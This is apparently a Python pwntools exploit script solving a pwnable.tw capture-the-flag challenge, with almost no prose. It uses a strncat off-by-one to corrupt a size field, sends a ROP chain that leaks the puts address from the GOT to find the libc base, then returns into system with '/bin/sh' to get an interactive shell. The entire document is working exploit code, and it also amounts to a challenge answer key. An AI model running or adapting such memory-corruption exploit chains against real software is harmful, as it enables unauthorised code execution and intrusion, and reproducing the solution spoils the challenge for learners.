###strncat off-by-one

from pwn import *

###Utils
def create(data):
    r.sendlineafter('choice :','1')
    r.sendafter('bullet :',data)

def powrup(data):
    r.sendlineafter('choice :','2')
    r.sendafter('bullet :',data)

def beat():
    r.sendlineafter('choice :','3')
    r.recvuntil('win !!\n')
    return u32(r.recvline()[:4])

def getshell():
    r.sendlineafter('choice :','3')
    r.interactive()

###Useful addr
#  libc2.23
main_addr = 0x8048954
puts_plt_addr = 0x80484a8
puts_got_addr = 0x804afdc
puts_offset = 0x5f140
pop_ebx_ret = 0x8048475
system_offset = 0x3a940
bin_sh_str_offset = 0x158e8b



###Start exploit
r = remote('chall.pwnable.tw',10103)

###Leak addr
## Create and leave one slot
create('a'*47)
## Update to let strncat sppend \x00 and overwrite size to 0
powrup('a')
## Prepare for next exploit + leak addr
fake_size = b'\xff\xff\xff'
padding = b'a'*4
ROPchain = p32(puts_plt_addr)   #ret addr
ROPchain+= p32(pop_ebx_ret)     #ret addr of puts
ROPchain+= p32(puts_got_addr)   #arg1 of puts
ROPchain+= p32(main_addr)       #ret addr of pop
payload = fake_size+padding+ROPchain

powrup(payload)
puts_addr = beat()
libc_base = puts_addr-puts_offset

###Hijack ret
create('a'*47)
powrup('a')
fake_size = b'\xff\xff\xff'
padding = b'a'*4
ROPchain = p32(libc_base+system_offset)     #ret addr
ROPchain+= b'a' *4                          #ret addr of puts - not important
ROPchain+= p32(libc_base+bin_sh_str_offset) #arg1 of system
payload = fake_size+padding+ROPchain

powrup(payload)
getshell()


